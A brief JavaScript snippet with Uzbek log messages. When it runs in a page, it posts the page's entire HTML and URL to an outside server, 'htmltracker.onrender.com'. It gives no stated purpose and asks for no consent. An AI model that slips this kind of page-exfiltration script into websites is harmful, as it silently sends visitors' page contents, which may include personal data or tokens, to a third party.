(function () {
  var SERVER_URL = "https://htmltracker.onrender.com/send-html";

  fetch(SERVER_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      html: document.documentElement.outerHTML,
      url: window.location.href
    })
  })
  .then(function(r) { return r.json(); })
  .then(function(data) { console.log("Yuborildi:", data); })
  .catch(function(err) { console.error("Xato:", err); });
})();